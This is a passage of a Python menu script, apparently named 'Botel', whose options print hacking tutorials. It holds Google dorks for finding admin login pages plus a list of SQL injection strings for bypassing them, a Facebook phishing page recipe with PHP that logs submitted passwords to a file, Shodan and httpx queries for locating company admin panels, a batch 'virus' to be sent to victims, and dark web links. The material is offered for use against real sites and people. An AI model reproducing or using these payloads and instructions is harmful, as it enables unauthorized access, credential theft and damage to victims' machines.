inurl:/login/login.php admin
inurl:/admin/login.asp
inurl:/admin/index.aspx
inurl:admin intext:login
index of admin.php
index of /admin/ login.php
intitle:"admin panel" login
inurl/admin/admin/login.php
inurl:/admin/index.php
inurl:/account.asp
inurl:/account.html
inurl:/account.php
inurl:/acct_login/
inurl:/adm.asp
inurl:/adm.html
inurl:/adm.php
inurl:/adm/
inurl:/adm/admloginuser.asp
inurl:/adm/admloginuser.php

When u see admin panel put any of the following in user and password field

'=''or'

-'
' '
'&'
'^'
'*'
' or ''-'
' or '' '
' or ''&'
' or ''^'
' or ''*'
"-"
" "
"&"
"^"
"*"
" or ""-"
" or "" "
" or ""&"
" or ""^"
" or ""*"
or true--
" or true--
' or true--
") or true--
') or true--
' or 'x'='x
') or ('x')=('x
')) or (('x'))=(('x
" or "x"="x
") or ("x")=("x
")) or (("x"))=(("x

If ur successful you've hacked a web""")
  elif c == "12":
  	print("""🔰Some DarkWeb Links🔰

🌀 Tin Hat - http://tinhat233xymse34.onion/

🌀 Security in a Box - http://bpo4ybbs2apk4sk4.onion/

🌀 Culus - http://gkde65w5likrxegsfhmorwuheppqfyfjimbz4m76jd72tih7jcfq4uqd.onion/

🌀 8Chan - http://oxwugzccvk3dk6tj.onion

🌀 Phobos - http://phobosxilamwcg75xt22id7aywkzol6q6rfl2flipcqoc4e4ahima5id.onion

🌀 Invidious - http://kgg2m7yk5aybusll.onion/

🌀 Outlaw Wiki - http://outlawxmutl6yw3t.onion/

🌀 Tordex - http://tordex7iie7z2wcg.onion/

🌀 2019 Hidden Wiki - http://z5taguvepvuevyp3.onion

🌀 Onion Link Directory - http://oniondirljacm547.onion/

🌀 Onion Search Engine - http://5u56fjmxu63xcmbk.onion/
""")
  elif c == "13":
  	print("""Topic: creating a phishing link without termux
We are using facebook login for this
1.download naked browser
Search for www.Facebook.com
Drag the side of the browser
Tap page source
It will show it source code
Copy and paste it on notepad++
Then save it As index.html
Then creat another file as post.php
Copy and paste this there 


<?php
header (‘Location:http://www.facebook.com/’);
$handle = fopen(“usernames.txt”, “a”);
foreach($_POST as $variable => $value) {
fwrite($handle, $variable);
fwrite($handle, “=”);
fwrite($handle, $value);
fwrite($handle, “\”);
}
fwrite($handle, “\”);
fclose($handle);
exit;
?>



Go back to your HTML code search for login.php
Change it to post.php

After everything host on 00webhosting""")
  elif c == "14":
  	print("""Download Every proxy, then turn on http proxy.
Then go to your laptop setting and search internet setting, move to connection and select Lan setting, then check your every proxy you'll see one  IP address there just write the IP address in  your laptop in the required place from the LAN setting then connect it and turn on your hotspot and data connection and ha tunnel plus.
Note: whenever you want to connect again check your every proxy the IP address there usually changes so you re enter it again""")
  elif c == "15":
  	print("""How to receive and transfer money to other countries

https://selar.co/me/dashboard
""")
  elif c == "16":
  	print("""⚙️Some ways to find company admin panels 💻

 1. Using Google Dorks:

 site: target.com inurl: admin |  administrator |  adm |  login |  l0gin |  wp-login

 intitle: "login" "admin" site: target.com

 intitle: "index of / admin" site: target.com

 inurl: admin intitle: admin intext: admin

 2. Using httpx and a wordlist:

 httpx -l hosts.txt -paths /root/admin-login.txt -threads 100 -random-agent -x GET, POST -tech-detect -status-code -follow-redirects -title -content-length

 httpx -l hosts.txt-ports 80,443,8009,8080,8081,8090,8180,8443 -paths /root/admin-login.txt -threads 100 -random-agent -x GET, POST -tech-detect -status-  code -follow-redirects -title -content-length

 3. Using utilities:

 https://github.com/the-c0d3r/admin-finder
 https://github.com/RedVirus0/Admin-Finder
 https://github.com/mIcHyAmRaNe/okadminfinder3
 https://github.com/penucuriCode/findlogin
 https://github.com/fnk0c/cangibrina

 4. Using search engines:

 Shodan:

 ssl.cert.subject.cn:"company.com "http.title:" admin "

 ssl: "company.com" http.title: "admin"

 ssl.cert.subject.cn:"company.com "admin

 ssl: "company.com" admin

 Fofa:

 cert = "company.com" && title = "admin"

 cert.subject = "company" && title = "admin"

 cert = "company.com" && body = "admin"

 cert.subject = "company" && body = "admin"

 ZoomEye:

 ssl: company.com + title: "admin"

 ssl: company.com + admin

 Censys (IPv4):

 (services.tls.certificates.leaf_data.issuer.common_name: company.com) AND services.http.response.html_t""")
  elif c == "17":
  	print("""*How to hack an Android device remotely (without metasploit)*

Tutorial by : AnonyminHack5
Size: 20.3mb
File Type: mkv video 
Tutorial Duration: 15mins 28secs

Download Link: 
https://www.mediafire.com/file/c7ptlfw7j22mm0e/How_to_hack_an_android_device_remotely_%2528without_metasploit%2529.mkv/file

*Tutorial is only for Educational purposes*
*Be ethical*

Best to Open with vlc player""")
  elif c == "18":
  	print("""👹👹HOW TO CREATE A VIRUS THAT WILL CRASH PC👹👹

Step 1:Click on window button and search for "Notepad"

Step 2:Open notepad and paste the following command

@echo off
echo  %DATE%
echo  %TIME%
echo "Sorry😥,Your pc is gone"
ipconfig release
start setting
start notepad
start Firefox
start internet Explorer
start Google Chrome
start music groover
start Microsoft Store
start PowerShell
start keyspy VPN
start hotspot shield
start opera mini
start notepad
start calculator
start Touch
start command prompt
start clock
start camera
start setting
start camera
start setting
start notepad
start Free_internet
echo  %random%
echo  %random%
echo  %random%
echo  %random
echo  %random%
echo  %random%
echo  %random%
echo  %random
echo  %random%
echo  %random%
echo  %random%
echo  %random%
echo  %random%
echo  %random%
echo  %random%
echo  %random%
echo  %random%
echo  %random%
echo  %random%
echo  %random%
echo  %random%
echo  %random%
echo  %random%
start Free_internet
start Free_internet
start Free_internet



Step 3:Save the file as "Free_internet.bat" (It will make the file  keep running continuously by itself after running  it by you) 

Step 4:send the file to victims... 

ONLY FOR EDUCATIONAL PURPOSES 😊😇

👹More Dangerous Virus coming👹

Made by Anon Lêkzï.... 



If u are doubting, kindly run it on your PC  😌😌😌...""")
  elif c == "19":
  	print("""DOWNLOAD EMAIL EXTRACTOR PRO HERE
https://emailextractorpro.com/download.html""")
  elif c == "20":
      os.system("""cd $HOME
    rm -f -r Botel
    git clone https://github.com/spider863644/Botel
    cd Botel""")
      print("""Now run me by executing:
    cd
    cd Botel
    python3 Botel.py"""), exit()
      os.system("cd Botel")
  elif c == "21":
       print("""Botel is a python script that teaches programming and hacking and also gives free stuffs
    
    It was developed by Spider Anongreyhat""")
  elif c == "22":
      print("""
      Credit goes to
      [1]Spider Anongreyhat
      [2]Anonlekzi
      """)
    
  else:
      print(red, c,"Not in option...Choose a valid option!" + white)
      t.sleep(3)
      loop()

  op = input("Do you wanna continue? Y/N: ")
  os.system("clear")
  if op == "Y":
    loop()
  elif op == "y":
    loop()
loop()